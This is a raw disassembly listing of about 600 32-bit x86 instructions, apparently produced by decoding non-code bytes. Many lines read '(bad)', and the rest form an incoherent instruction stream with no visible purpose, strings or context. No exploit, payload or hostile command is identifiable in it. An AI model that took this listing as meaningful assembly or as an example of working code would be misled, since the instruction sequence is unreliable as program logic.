  40c84e:	add    ah,cl
  40c850:	add    bh,bh
  40c852:	pop    edi
  40c853:	aad    0x83
  40c855:	add    BYTE PTR [edx-0x34],cl
  40c858:	int3   
  40c859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85a:	out    dx,al
  40c85b:	call   DWORD PTR [edx+0xff891e]
  40c861:	push   DWORD PTR [eax+0x6800ffd5]
  40c867:	fadd   DWORD PTR [eax]
  40c869:	fisttp QWORD PTR ds:0xcc8390ff
  40c86f:	(bad)  
  40c870:	inc    DWORD PTR [eax]
  40c872:	aad    0x52
  40c874:	mov    DWORD PTR [eax],eax
  40c876:	not    DWORD PTR [eax+0x0]
  40c879:	std    
  40c87a:	push   cs
  40c87b:	dec    DWORD PTR [ebp-0x5b]
  40c87e:	dec    DWORD PTR [ecx-0x594cff01]
  40c884:	mov    edi,edi
  40c886:	xchg   ebx,eax
  40c887:	push   ebx
  40c888:	push   esp
  40c88a:	mov    esp,0xff93a600
  40c88f:	int3   
  40c890:	add    bh,bh
  40c892:	repz push esi
  40c894:	inc    DWORD PTR [ebx-0x35332ddb]
  40c89a:	icebp  
  40c89b:	inc    DWORD PTR [eax]
  40c89d:	lock add BYTE PTR [eax],al
  40c8a0:	inc    DWORD PTR [eax]
  40c8a2:	cld    
  40c8a3:	ins    BYTE PTR es:[edi],dx
  40c8a4:	inc    DWORD PTR [eax]
  40c8a6:	fcomp  DWORD PTR [edx]
  40c8a8:	(bad)  
  40c8a9:	mov    esp,0xffb783ff
  40c8ae:	add    bh,bh
  40c8b0:	dec    esp
  40c8b2:	in     eax,0x66
  40c8b4:	add    bh,bh
  40c8b6:	dec    eax
  40c8b7:	inc    edx
  40c8b8:	push   edi
  40c8ba:	jnp    0x40c8bc
  40c8bc:	cmp    al,0x44
  40c8be:	int3   
  40c8bf:	int3   
  40c8c0:	add    bh,bh
  40c8c2:	mov    ecx,gs
  40c8c4:	inc    DWORD PTR [eax]
  40c8c6:	mov    ebx,0xedb3ff7b
  40c8cb:	add    dh,ah
  40c8cd:	fdivr  st,st(7)
  40c8cf:	(bad)  
  40c8d0:	inc    DWORD PTR [ebx-0x7728]
  40c8d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8d7:	jno    0x40c8d8
  40c8d9:	sbb    al,0x17
  40c8db:	jmp    FWORD PTR [eax]
  40c8dd:	js     0x40c868
  40c8df:	inc    DWORD PTR [eax]
  40c8e1:	add    BYTE PTR [esi+edx*4],dh
  40c8e4:	add    DWORD PTR [eax],0x72
  40c8e7:	cwde   
  40c8e8:	(bad)  
  40c8e9:	call   0x34ff952c
  40c8ee:	cmp    edi,0xffffff89
  40c8f1:	jmp    DWORD PTR [esi-0x7d00004f]
  40c8f7:	and    edi,edi
  40c8f9:	push   esi
  40c8fa:	xchg   DWORD PTR [ecx+0x9218],ecx
  40c900:	inc    DWORD PTR [eax]
  40c902:	(bad)  
  40c903:	mov    DWORD PTR [eax],0xfff266ff
  40c909:	push   ebx
  40c90a:	or     eax,0xffd31f00
  40c90f:	inc    DWORD PTR [ebx-0x3d467d]
  40c915:	add    BYTE PTR [ebx],dh
  40c917:	loopne 0x40c919
  40c919:	mov    esp,0xe1e4cca9
  40c91e:	(bad)  
  40c91f:	inc    DWORD PTR [ebx-0x57b201]
  40c925:	call   DWORD PTR [eax]
  40c927:	aam    0xff
  40c929:	inc    edi
  40c92a:	inc    esp
  40c92b:	(bad)  
  40c92c:	mov    eax,0xffffffe4
  40c931:	int3   
  40c932:	subps  xmm0,XMMWORD PTR [eax]
  40c935:	(bad)  
  40c936:	inc    DWORD PTR [eax]
  40c938:	and    DWORD PTR [ecx+0x3d],0xffffffff
  40c93c:	pop    ecx
  40c93d:	pop    esp
  40c93e:	int3   
  40c93f:	inc    DWORD PTR [eax]
  40c941:	(bad)  
  40c942:	clc    
  40c943:	cmp    al,BYTE PTR [eax]
  40c945:	add    BYTE PTR [eax-0x57],bl
  40c948:	(bad)  
  40c949:	in     eax,dx
  40c94a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c94b:	sub    DWORD PTR [edx-0x3333004c],0xffffff83
  40c952:	dec    esi
  40c953:	rol    DWORD PTR [ebx-0x33422501],cl
  40c959:	mov    al,0x51
  40c95b:	add    BYTE PTR [esi+0x89ff],ch
  40c961:	mov    DWORD PTR [edi],ecx
  40c963:	fiadd  WORD PTR [eax]
  40c965:	jmp    FWORD PTR [ebx]
  40c967:	sbb    ecx,esp
  40c969:	shl    al,0xff
  40c96c:	jp     0x40c919
  40c96e:	add    DWORD PTR [eax],0xffffffff
  40c971:	xor    esp,0x1
  40c974:	(bad)  
  40c975:	jmp    FWORD PTR [ebp-0x5]
  40c978:	mov    DWORD PTR [edx-0x6b5700fe],ebp
  40c97e:	mov    DWORD PTR [eax],eax
  40c980:	add    BYTE PTR [ebx+0x830fc2],al
  40c986:	push   ds
  40c987:	add    DWORD PTR [eax],0xffffffb9
  40c98a:	(bad)  
  40c98b:	call   DWORD PTR [edx+0x6b]
  40c98e:	or     esp,0x0
  40c991:	inc    ebp
  40c993:	pop    esi
  40c994:	add    BYTE PTR [ebx-0x66007b23],al
  40c99a:	pop    ecx
  40c99b:	call   FWORD PTR [edi-0x23]
  40c99e:	(bad)  
  40c99f:	inc    DWORD PTR [eax]
  40c9a1:	add    BYTE PTR [eax+0x63],dh
  40c9a4:	add    bh,bh
  40c9a6:	jl     0x40c93b
  40c9a8:	call   FWORD PTR [edx-0x4]
  40c9ab:	add    DWORD PTR [ebp-0x7],0xffffffff
  40c9af:	add    BYTE PTR [eax],al
  40c9b1:	and    DWORD PTR [eax+eiz*1],0xffffff89
  40c9b5:	call   FWORD PTR [ebx]
  40c9b7:	or     BYTE PTR [eax],al
  40c9b9:	mov    ebx,0xf399ff29
  40c9be:	(bad)  
  40c9bf:	dec    DWORD PTR [ecx-0x7c15d201]
  40c9c5:	int3   
  40c9c6:	in     eax,dx
  40c9c7:	cmp    bh,bh
  40c9c9:	aad    0x8c
  40c9cb:	mov    DWORD PTR [ebx],esi
  40c9cd:	xchg   ebp,eax
  40c9ce:	add    bh,bh
  40c9d0:	mov    edi,edi
  40c9d2:	mov    edi,0xe3ff00bb
  40c9d7:	jno    0x40c9a5
  40c9d9:	xor    ebx,DWORD PTR [edi-0x7d]
  40c9dc:	adc    al,0x3
  40c9de:	(bad)  
  40c9df:	dec    DWORD PTR [ecx-0x917d01]
  40c9e5:	add    BYTE PTR [ecx+ecx*4-0x34],dl
  40c9e9:	fbstp  TBYTE PTR [edx]
  40c9eb:	call   FWORD PTR [ecx+0x46]
  40c9ee:	(bad)  
  40c9ef:	dec    DWORD PTR [ecx-0x1f6d01]
  40c9f5:	push   DWORD PTR [ecx+0x56]
  40c9f8:	add    ah,dl
  40c9fa:	or     eax,0x89fffe00
  40c9ff:	inc    DWORD PTR [ebx+0xc56dcc]
  40ca05:	(bad)  
  40ca06:	fucom  st(4)
  40ca08:	or     DWORD PTR ds:0x802f89c5,0xffffffff
  40ca0f:	add    bh,bh
  40ca11:	jmp    DWORD PTR [esi+0x1d00ff14]
  40ca17:	xor    al,0xff
  40ca19:	add    al,bh
  40ca1b:	int3   
  40ca1c:	jmp    0x10cc:0xffccfff0
  40ca23:	jle    0x40ca25
  40ca25:	add    BYTE PTR [esi+edi*2-0x1],ah
  40ca29:	clc    
  40ca2a:	or     al,0xff
  40ca2c:	xor    ebp,eax
  40ca2e:	add    bh,bh
  40ca30:	(bad)  
  40ca31:	jmp    FWORD PTR [eax]
  40ca33:	xchg   ecx,eax
  40ca34:	inc    DWORD PTR [eax]
  40ca36:	or     ebx,ebp
  40ca38:	(bad)  
  40ca39:	ds xchg ebx,eax
  40ca3b:	push   DWORD PTR [esi]
  40ca3d:	add    BYTE PTR [ebx+0x90000ff],0x7a
  40ca44:	add    bh,bh
  40ca46:	adc    eax,0xb54e001c
  40ca4b:	call   FWORD PTR [eax+0xb]
  40ca4e:	inc    DWORD PTR [eax]
  40ca50:	add    BYTE PTR [ebx-0x337014],al
  40ca56:	sub    esp,DWORD PTR [ecx+0x0]
  40ca59:	xor    al,0x73
  40ca5b:	add    dh,ch
  40ca5d:	pop    eax
  40ca5e:	int3   
  40ca5f:	add    BYTE PTR [eax],al
  40ca61:	inc    DWORD PTR [edi+0xc]
  40ca64:	(bad)  
  40ca65:	call   DWORD PTR [ebx+edi*1]
  40ca68:	call   FWORD PTR [esi]
  40ca6a:	mov    esp,0xff192483
  40ca6f:	(bad)  
  40ca70:	(bad)  
  40ca71:	call   FWORD PTR [edx]
  40ca73:	cmp    bh,bh
  40ca75:	sbb    DWORD PTR [ebp+0x30b18377],0xffffffff
  40ca7c:	mov    edx,0xffccff85
  40ca81:	inc    DWORD PTR ds:0x55000050
  40ca87:	stos   DWORD PTR es:[edi],eax
  40ca88:	sbb    DWORD PTR [edx-0x50533b4],0xffffffff
  40ca8f:	add    BYTE PTR [eax],al
  40ca91:	int3   
  40ca92:	mov    ebp,DWORD PTR [ebp-0x1]
  40ca95:	jmp    DWORD PTR [edi+ecx*2]
  40ca98:	dec    DWORD PTR [edi-0x5b54ff0e]
  40ca9e:	add    BYTE PTR [ebx-0x64700100],al
  40caa4:	(bad)  
  40caa5:	push   DWORD PTR [ebx-0x2d3eff96]
  40caab:	int3   
  40caac:	jl     0x40ca5d
  40caae:	add    ah,cl
  40cab0:	add    BYTE PTR [ebx+0xccb2bd],al
  40cab6:	cwde   
  40cab7:	gs int3 
  40cab9:	adc    BYTE PTR [esi-0x377077],dl
  40cabf:	add    BYTE PTR [eax],al
  40cac1:	int3   
  40cac2:	xchg   DWORD PTR [eax],edi
  40cac4:	(bad)  
  40cac5:	push   DWORD PTR [ebx]
  40cac7:	xor    bh,bh
  40cac9:	dec    eax
  40caca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cacb:	add    BYTE PTR [eax],ch
  40cacd:	dec    ecx
  40cace:	add    DWORD PTR [ebx-0x4be50100],0xffffff83
  40cad5:	call   FWORD PTR ds:0xdcd00060
  40cadb:	call   DWORD PTR [edx]
  40cadd:	pop    ebx
  40cade:	(bad)  
  40cadf:	(bad)  
  40cae0:	inc    DWORD PTR [eax]
  40cae2:	and    esp,DWORD PTR [ebx-0x1]
  40cae5:	int3   
  40cae6:	mov    DWORD PTR [edi],0x834ff7ff
  40caec:	std    
  40caed:	mov    edi,0xff8389ff
  40caf2:	jge    0x40caf4
  40caf4:	inc    DWORD PTR [eax]
  40caf6:	or     al,0x6c
  40caf8:	push   DWORD PTR [edx-0x57a300e9]
  40cafe:	cmp    edi,0xffffffff
  40cb01:	sbb    DWORD PTR [eax+esi*8],0xffffffff
  40cb05:	adc    DWORD PTR [edx-0x4f],0xffffffff
  40cb09:	jae    0x40cb15
  40cb0b:	add    BYTE PTR [ecx],dh
  40cb0d:	or     edi,edi
  40cb0f:	(bad)  
  40cb10:	inc    DWORD PTR [eax]
  40cb12:	mov    ds:0x42ff00f0,eax
  40cb17:	xchg   edi,eax
  40cb18:	add    BYTE PTR [edx-0x54],bh
  40cb1b:	(bad)  
  40cb1c:	mov    edx,0xff0000f4
  40cb21:	add    BYTE PTR [eax-0x133fff2],dl
  40cb27:	fdivp  st(7),st
  40cb29:	ret    
  40cb2a:	sahf   
  40cb2b:	add    BYTE PTR [esp-0x1],ah
  40cb2f:	int3   
  40cb30:	inc    DWORD PTR [eax]
  40cb32:	les    ebx,FWORD PTR [ebx]
  40cb34:	inc    DWORD PTR [eax]
  40cb36:	push   ss
  40cb37:	mov    DWORD PTR [ebx+0x708314f8],0xff830017
  40cb41:	and    DWORD PTR [ecx+esi*4-0x1],0xffffffcc
  40cb46:	sbb    al,0x35
  40cb48:	inc    DWORD PTR [ecx+0x6f]
  40cb4b:	int3   
  40cb4c:	es add edi,edi
  40cb4f:	add    ah,cl
  40cb51:	jmp    DWORD PTR [edi]
  40cb53:	lock int3 
  40cb55:	(bad)  
  40cb56:	mov    ebx,0x568c0099
  40cb5b:	(bad)  
  40cb5c:	ffree  st(2)
  40cb5e:	mov    edi,edi
  40cb60:	(bad)  
  40cb61:	call   FWORD PTR [eax-0x40]
  40cb64:	int3   
  40cb65:	add    DWORD PTR [edi-0x3],0xffffff89
  40cb69:	int3   
  40cb6a:	loop   0x40cb6b
  40cb6c:	mov    ebx,0xffff53
  40cb71:	add    BYTE PTR [ecx+esi*2+0x0],ah
  40cb75:	add    BYTE PTR [edx-0x205076de],ah
  40cb7b:	call   ecx
  40cb7d:	inc    eax
  40cb7e:	inc    DWORD PTR [eax]
  40cb80:	mov    edi,edi
  40cb82:	or     al,0x4e
  40cb84:	inc    DWORD PTR [ebx-0x75009de5]
  40cb8a:	adc    eax,0x8374db00
  40cb8f:	int3   
  40cb90:	inc    DWORD PTR [eax]
  40cb92:	mov    WORD PTR [esi+0x786a00cc],fs
  40cb98:	int3   
  40cb99:	sub    al,0x41
  40cb9b:	add    ch,al
  40cb9d:	mov    eax,0xff0000
  40cba2:	pop    edx
  40cba3:	out    0xff,al
  40cba5:	add    BYTE PTR [esi-0xb8fff26],cl
  40cbab:	int3   
  40cbac:	sbb    al,0xa7
  40cbae:	add    BYTE PTR [eax],al
  40cbb0:	add    bh,bh
  40cbb2:	xchg   edx,eax
  40cbb3:	das    
  40cbb4:	(bad)  
  40cbb5:	dec    esi
  40cbb7:	jmp    0xff960bbc
  40cbbc:	adc    DWORD PTR [eax+eax*1+0x4789ffff],ecx
  40cbc3:	xor    edi,edi
  40cbc5:	adc    ebp,0xffffffd6
  40cbc8:	add    ah,bl
  40cbca:	xor    al,BYTE PTR [eax]
  40cbcc:	cmp    DWORD PTR [ecx-0x1],esp
  40cbcf:	cmp    edi,0x0
  40cbd2:	hlt    
  40cbd3:	or     DWORD PTR [ecx+0x8abc89],0xffffff98
  40cbda:	inc    ebx
  40cbdb:	sub    DWORD PTR [edi+0xffff58],0xffffffcc
  40cbe2:	fwait
  40cbe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbe4:	add    DWORD PTR [eax],0x71
  40cbe7:	mov    al,0xff
  40cbe9:	mov    eax,0x1997ffd4
  40cbee:	add    BYTE PTR [eax],al
  40cbf0:	(bad)  
  40cbf1:	dec    DWORD PTR [eax]
  40cbf3:	pusha  
  40cbf4:	int3   
  40cbf5:	dec    DWORD PTR [ebx-0x3c]
  40cbf8:	int3   
  40cbf9:	jae    0x40cc59
  40cbfb:	add    BYTE PTR [esi-0x4f],ah
  40cbfe:	inc    DWORD PTR [ebx+0x5ece8300]
  40cc04:	add    BYTE PTR [eax],al
  40cc06:	add    BYTE PTR [edx+0x0],0x4d
  40cc0a:	jo     0x40cb8f
  40cc0c:	aaa    
  40cc0d:	lods   al,BYTE PTR ds:[esi]
  40cc0e:	inc    DWORD PTR [eax]
  40cc10:	add    BYTE PTR [eax],al
  40cc12:	lods   eax,DWORD PTR ds:[esi]
  40cc13:	pop    ecx
  40cc14:	inc    DWORD PTR [ebx+0x28ffeede]
  40cc1a:	loop   0x40cc1b
  40cc1c:	cmp    ebp,DWORD PTR [ebx+eax*4+0x42ffffff]
  40cc23:	repnz cmp edi,0x2f
  40cc27:	xchg   ecx,eax
  40cc28:	call   FWORD PTR [ebx]
  40cc2a:	jae    0x40cc2c
  40cc2c:	adc    BYTE PTR [ebp+0x0],0xcc
  40cc30:	add    bh,bh
  40cc32:	cdq    
  40cc33:	and    DWORD PTR [eax],eax
  40cc35:	add    BYTE PTR [edx],ah
  40cc37:	dec    edx
  40cc38:	dec    DWORD PTR [ecx-0x7107ffe3]
  40cc3e:	int3   
  40cc3f:	add    bh,bh
  40cc41:	push   DWORD PTR [ecx-0x3a]
  40cc44:	or     esp,0xffffffdb
  40cc47:	jnp    0x40cc48
  40cc49:	aas    
  40cc4a:	sub    al,BYTE PTR [ebx-0x7c49ce]
  40cc50:	(bad)  
  40cc51:	dec    DWORD PTR [edx-0x6b]
  40cc54:	int3   
  40cc55:	int3   
  40cc56:	add    BYTE PTR [eax],bl
  40cc58:	add    BYTE PTR [eax+0x41ed0056],bh
  40cc5e:	add    BYTE PTR [ebx+0x13e600ff],al
  40cc64:	inc    DWORD PTR [eax]
  40cc66:	ret    0xb6
  40cc69:	cmc    
  40cc6a:	ds sub esp,0xffffffb9
  40cc6e:	inc    DWORD PTR [ebx-0x40bff01]
  40cc74:	add    DWORD PTR [eax],0xfffffffd
  40cc77:	dec    edi
  40cc78:	push   DWORD PTR [edi]
  40cc7a:	fdivr  st,st(7)
  40cc7c:	jne    0x40cc8f
  40cc7e:	or     esp,0xffffffcc
  40cc81:	jmp    FWORD PTR [edi-0x64]
  40cc84:	inc    DWORD PTR [eax]
  40cc86:	sub    bl,BYTE PTR [edx+0x0]
  40cc89:	shl    ecx,0xff
  40cc8c:	mov    edi,gs
  40cc8e:	dec    esp
  40cc90:	inc    DWORD PTR [eax]
  40cc92:	jae    0x40cc99
  40cc94:	(bad)  
  40cc95:	(bad)  
  40cc96:	in     eax,dx
  40cc97:	mov    dl,0xff
  40cc99:	test   DWORD PTR [edi-0x1],esp
  40cc9c:	jnp    0x40cc24
  40cc9e:	inc    DWORD PTR [ebx-0x19a40001]
  40cca4:	int3   
  40cca5:	call   FWORD PTR [edx+ebx*2+0x0]
  40cca9:	retf   
  40ccaa:	jne    0x40cc2f
  40ccac:	lahf   
  40ccad:	push   ds
  40ccae:	add    DWORD PTR [ebx+0x1daa0083],0xffffffcc
  40ccb5:	int3   
  40ccb6:	cwde   
  40ccb7:	lods   eax,DWORD PTR ds:[esi]
  40ccb8:	(bad)  
  40ccb9:	jge    0x40cd23
  40ccbb:	add    ah,ch
  40ccbd:	jae    0x40ccbe
  40ccbf:	add    bh,bh
  40ccc1:	add    BYTE PTR [ecx+ecx*8+0x52e983ff],ch
  40ccc8:	push   DWORD PTR [ecx+0x3d20ff6f]
  40ccce:	(bad)  
  40cccf:	dec    DWORD PTR [ecx-0x64527d]
  40ccd5:	mov    DWORD PTR [eax+0x27],ecx
  40ccd8:	(bad)  
  40ccd9:	mov    eax,0xf575008f
  40ccde:	cmp    edi,0xffffffff
  40cce1:	call   FWORD PTR [ebp+0x31ffff4f]
  40cce7:	fadd   DWORD PTR [eax]
  40cce9:	cli    
  40ccea:	push   esi
  40cceb:	jmp    ecx
  40cced:	clc    
  40ccee:	inc    DWORD PTR [eax]
  40ccf0:	add    BYTE PTR [eax],al
  40ccf2:	mov    bl,0x5f
  40ccf4:	int3   
  40ccf5:	call   DWORD PTR [eax]
  40ccf7:	in     eax,dx
  40ccf8:	int3   
  40ccf9:	packuswb mm7,mm7
  40ccfc:	(bad)  
  40ccfd:	inc    DWORD PTR fs:[ebx-0x69f37c01]
  40cd04:	(bad)  
  40cd05:	inc    DWORD PTR [eax+0x7ec2ff02]
  40cd0b:	sub    DWORD PTR [ebp-0x1e],0x0
  40cd0f:	inc    DWORD PTR [ebx-0x3373c201]
  40cd15:	jmp    FWORD PTR [eax]
  40cd17:	or     al,0x0
  40cd19:	dec    ebp
  40cd1a:	imul   edi,edi,0xffffd410
  40cd20:	cmp    edi,0xe
  40cd23:	pop    ebp
  40cd24:	(bad)  
  40cd25:	call   DWORD PTR [edi+edi*2-0xdcd901]
  40cd2c:	fidivr DWORD PTR [ebp-0x7d]
  40cd2f:	inc    DWORD PTR [eax]
  40cd31:	jmp    DWORD PTR ds:0x6200832e
  40cd37:	and    eax,DWORD PTR [eax]
  40cd39:	push   0xfffffff7
  40cd3b:	mov    ecx,ebp
  40cd3d:	fisttp DWORD PTR [ecx+0x2a83ffff]
  40cd43:	test   al,0x89
  40cd45:	jmp    edi
  40cd47:	cwde   
  40cd48:	dec    DWORD PTR [esi+ebx*2+0x4d26ff]
  40cd4f:	add    bh,bh
  40cd51:	mov    DWORD PTR [esi],esi
  40cd53:	mov    dl,0xff
  40cd55:	mov    edi,eax
  40cd57:	(bad)  
  40cd59:	stos   DWORD PTR es:[edi],eax
  40cd5a:	(bad)
  40cd5d:	jb     0x40cd5f
  40cd5f:	add    BYTE PTR [eax],al
  40cd61:	add    BYTE PTR [esi+0x17000016],bl
  40cd67:	xor    edi,edi
  40cd69:	shl    BYTE PTR [eax],0x83
  40cd6c:	mov    ah,BYTE PTR [eax]
  40cd6e:	add    BYTE PTR [eax],al
  40cd70:	add    bh,bh
  40cd72:	stc    
  40cd73:	es (bad) 
  40cd75:	jmp    DWORD PTR [edi+esi*2]
  40cd78:	call   esi
  40cd7a:	leave  
  40cd7b:	add    BYTE PTR [ebp-0x330083],al
  40cd81:	add    BYTE PTR [ecx-0x340000f5],dl
  40cd87:	and    DWORD PTR [eax],eax
  40cd89:	ret    0xffd5
  40cd8c:	ins    DWORD PTR es:[edi],dx
  40cd8d:	repnz inc DWORD PTR [eax]
  40cd90:	mov    DWORD PTR [ebx+0x8b86],eax
  40cd96:	fwait
  40cd97:	(bad)  
  40cd98:	dec    edx
  40cd9a:	or     eax,DWORD PTR [eax]
  40cd9c:	ret    0x89ff
  40cd9f:	inc    DWORD PTR [eax]
  40cda1:	xor    DWORD PTR [ecx+0x14],0x0
  40cda5:	add    BYTE PTR [ecx-0x5736003f],al
  40cdab:	add    BYTE PTR [eax-0xffaa],cl
  40cdb1:	add    BYTE PTR [ebx],bl
  40cdb3:	pop    esp
  40cdb4:	mov    esp,ecx
  40cdb6:	adc    dl,BYTE PTR [esi]
  40cdb8:	add    BYTE PTR [eax],al
  40cdba:	mov    edi,edi
  40cdbc:	inc    DWORD PTR [eax]
  40cdbe:	inc    DWORD PTR [eax]
  40cdc0:	add    BYTE PTR [edx],bl
  40cdc2:	pop    eax
  40cdc3:	cmp    DWORD PTR [edx-0x1],0x55
  40cdc7:	add    al,ah
  40cdc9:	inc    DWORD PTR [eax]
  40cdcb:	mov    dh,0xd2
  40cdcd:	inc    DWORD PTR [edi+0x0]
  40cdd0:	int3   
  40cdd1:	or     eax,0x83c0ff09
  40cdd6:	xchg   DWORD PTR [eax],eax
  40cdd8:	sti    
  40cdd9:	dec    DWORD PTR [ecx-0x5a00be61]
  40cddf:	or     esp,0x13
  40cde2:	cmp    al,0xff
  40cde4:	mov    ch,0xff
  40cde6:	into   
  40cde7:	add    BYTE PTR [ecx-0x34],ch
  40cdea:	(bad)  
  40cdeb:	js     0x40ce1a
  40cded:	add    BYTE PTR [ebp+0x0],bl
  40cdf0:	dec    edx
  40cdf2:	xlat   BYTE PTR ds:[ebx]
  40cdf3:	add    bh,ch
  40cdf5:	(bad)  
  40cdf6:	fild   WORD PTR [eax]
  40cdf8:	ret    
  40cdf9:	(bad)  
  40cdfa:	push   DWORD PTR [ebx]
  40cdfc:	push   ss
  40cdfd:	inc    esi
  40cdff:	dec    DWORD PTR [ecx-0x667c31b3]
  40ce05:	(bad)  
  40ce06:	fcos   
  40ce08:	inc    edx
  40ce09:	add    bh,bh
  40ce0b:	mov    dh,0x2e
  40ce0d:	add    BYTE PTR [esi-0x184ff34],dh
  40ce13:	add    BYTE PTR [ebp+0x0],bh
  40ce16:	xchg   esi,eax
  40ce17:	jmp    FWORD PTR [eax+eax*1]
  40ce1a:	jmp    DWORD PTR [ecx-0x9b7c6c]
  40ce20:	mov    DWORD PTR [edi+edi*4+0x6bff1000],ecx
  40ce27:	push   DWORD PTR [ebp-0x6cb9ff01]
  40ce2d:	int3   
  40ce2e:	sbb    al,0xff
  40ce30:	add    BYTE PTR [esi-0x960006],ch
  40ce36:	mov    dh,0x89
  40ce38:	push   edx
  40ce39:	dec    DWORD PTR [ecx-0x6100160e]
  40ce3f:	add    BYTE PTR [eax],al
  40ce41:	mov    esp,0xffdc8950
  40ce46:	add    bh,bh
  40ce48:	mov    ebp,0x138b89ff
  40ce4d:	inc    DWORD PTR [esi+0x5404ff83]
  40ce53:	add    bl,dh
  40ce55:	add    BYTE PTR [edi],dl
  40ce57:	add    dl,bl
  40ce59:	inc    DWORD PTR [ebx-0x2300add3]
  40ce5f:	add    ah,cl
  40ce61:	(bad)  
  40ce62:	int3   
  40ce63:	call   FWORD PTR [esi+0x0]
  40ce66:	test   bh,bh
  40ce68:	test   bh,bh
  40ce6a:	adc    DWORD PTR [ebp-0xad00e1],0xffffffff
  40ce71:	pop    ds
  40ce72:	lods   al,BYTE PTR ds:[esi]
  40ce73:	(bad)  
  40ce74:	stc    
  40ce75:	add    BYTE PTR [esi-0x7d],dh
  40ce78:	lds    eax,FWORD PTR [eax]
  40ce7a:	int3   
  40ce7b:	sbb    DWORD PTR [edx-0x1],esp
  40ce7e:	mov    DWORD PTR [ebx+0x51eeff],0x48003c
  40ce88:	fwait
  40ce89:	add    BYTE PTR [eax],al
  40ce8b:	lock inc ecx
  40ce8d:	add    DWORD PTR [ebx+0x0],0x0
  40ce91:	push   ss
  40ce92:	or     al,BYTE PTR [eax]
  40ce94:	lods   eax,DWORD PTR ds:[esi]
  40ce95:	add    BYTE PTR [ecx-0x7d],dl
  40ce98:	pop    ebx
  40ce99:	add    BYTE PTR [eax],al
  40ce9b:	cdq    
  40ce9c:	test   edi,edi
  40ce9e:	clc    
  40ce9f:	(bad)  
  40cea0:	dec    esi
  40cea2:	sub    eax,0xeaffa9ff
  40cea7:	add    BYTE PTR [ecx-0x1],bh
  40ceaa:	(bad)  
  40ceab:	fld    TBYTE PTR [esi-0x1]
  40ceae:	iret   
  40ceaf:	int3   
  40ceb0:	mov    DWORD PTR [esi+ebp*4],ebx
  40ceb3:	jmp    DWORD PTR [edi-0x1]
  40ceb6:	jns    0x40ceb7
  40ceb8:	sbb    edi,edi
  40ceba:	add    BYTE PTR [ebp+0x6d],ch
  40cebd:	dec    DWORD PTR [edi-0x7d]
  40cec0:	add    cl,dh
  40cec2:	lea    eax,[eax]
  40cec4:	mov    dh,0xff
  40cec6:	jmp    0xdb83:0xffffabff
  40cecd:	add    BYTE PTR [edi-0x3fb03400],dl
  40ced3:	(bad)  
  40ced4:	inc    BYTE PTR [ebx-0x7601009a]
  40ceda:	int3   
  40cedb:	(bad)
  40cede:	in     al,0xcc
  40cee0:	add    BYTE PTR [ecx+0x54],ch
  40cee3:	add    dh,bl
  40cee5:	(bad)  
  40cee6:	jmp    0xff4128ea
  40ceeb:	lods   eax,DWORD PTR ds:[esi]
  40ceec:	mov    ebp,0xffff2c00
  40cef1:	mov    eax,0xffcd00bd
  40cef6:	and    bh,bh
  40cef8:	fdivp  st(7),st
  40cefa:	mov    DWORD PTR [ecx-0x33c500d5],esi
  40cf00:	or     DWORD PTR [edi],0x9
  40cf03:	jmp    FWORD PTR [ebp-0x6bffcb77]
  40cf09:	add    BYTE PTR [eax],al
  40cf0b:	fcmovnbe st,st(1)
  40cf0d:	or     DWORD PTR [ecx],0xffffff83
  40cf10:	or     ebx,0x62
  40cf13:	add    BYTE PTR [esi],ah
  40cf15:	add    BYTE PTR [ecx],al
  40cf17:	add    BYTE PTR [edi+0x7f000ff],ch
  40cf1d:	call   FWORD PTR [edx+0x0]
  40cf20:	add    BYTE PTR [eax-0x39],al
  40cf23:	add    BYTE PTR [eax+eax*1-0x7c26764b],cl
  40cf2a:	call   FWORD PTR [ecx+0xf1ff42]
  40cf30:	mov    DWORD PTR [eax-0xa876af],ecx
  40cf36:	and    edi,edi
  40cf38:	adc    edi,edi
  40cf3a:	int3   
  40cf3b:	jge    0x40cedf
  40cf3d:	mov    DWORD PTR [ebx],edx
  40cf3f:	dec    esp
  40cf41:	add    eax,0xff92cc0a
  40cf46:	jno    0x40cf47
  40cf48:	mov    edi,0x9444ffff
  40cf4d:	adc    esi,0xffffffff
  40cf50:	add    dh,ch
  40cf52:	cdq    
  40cf53:	add    BYTE PTR [ebp-0x1],ch
  40cf56:	retf   
  40cf57:	push   DWORD PTR [esi]
  40cf59:	(bad)  
  40cf5a:	call   DWORD PTR [ebp-0x54]
  40cf5d:	jmp    FWORD PTR [edx-0x2f027d00]
  40cf63:	add    ch,cl
  40cf65:	dec    edx
  40cf67:	or     DWORD PTR [ebx-0x34],0xffffffff
  40cf6b:	fadd   DWORD PTR [eax]
  40cf6e:	test   ah,cl
  40cf70:	call   FWORD PTR [esi]
  40cf72:	in     al,0x0
  40cf74:	inc    ebp
  40cf75:	add    BYTE PTR [edx],al
  40cf77:	mov    ecx,edi
  40cf79:	add    ah,cl
  40cf7b:	outs   dx,BYTE PTR ds:[esi]
  40cf7c:	fld    DWORD PTR [ebx+0x348900eb]
  40cf82:	cmp    bh,0xf4
  40cf85:	push   DWORD PTR [ecx+0x0]
  40cf88:	mov    ebp,0x74f4ffcc
  40cf8d:	call   DWORD PTR [edi+0x2617ffcc]
  40cf93:	mov    DWORD PTR [ebx+0x5bffddff],ebx
  40cf99:	add    bh,bh
  40cf9b:	sbb    BYTE PTR [edi-0x33f801],dh
  40cfa1:	push   es
  40cfa2:	sbb    edi,edi
  40cfa4:	test   BYTE PTR [eax],al
  40cfa6:	pop    edx
  40cfa7:	add    BYTE PTR [ebp+0x5d6500ff],bh
  40cfad:	jmp    ebp
  40cfaf:	(bad)  
  40cfb0:	(bad)  
  40cfb1:	cmp    DWORD PTR ds:0xa289cc00,ecx
  40cfb7:	add    BYTE PTR [esi],bh
  40cfb9:	dec    esp
  40cfbb:	test   BYTE PTR [edi+edi*8-0x7d007610],dh
  40cfc2:	pop    ds
  40cfc3:	add    ch,dh
  40cfc5:	call   eax
  40cfc7:	(bad)  
  40cfc8:	in     eax,dx
  40cfc9:	int3   
  40cfca:	push   DWORD PTR [edx]
  40cfcc:	loope  0x40cfcd
  40cfce:	stc    
  40cfcf:	add    BYTE PTR [eax],al
  40cfd1:	dec    eax
  40cfd2:	clc    
  40cfd3:	(bad)  
  40cfd4:	cli    
  40cfd5:	jmp    FWORD PTR [ebx]
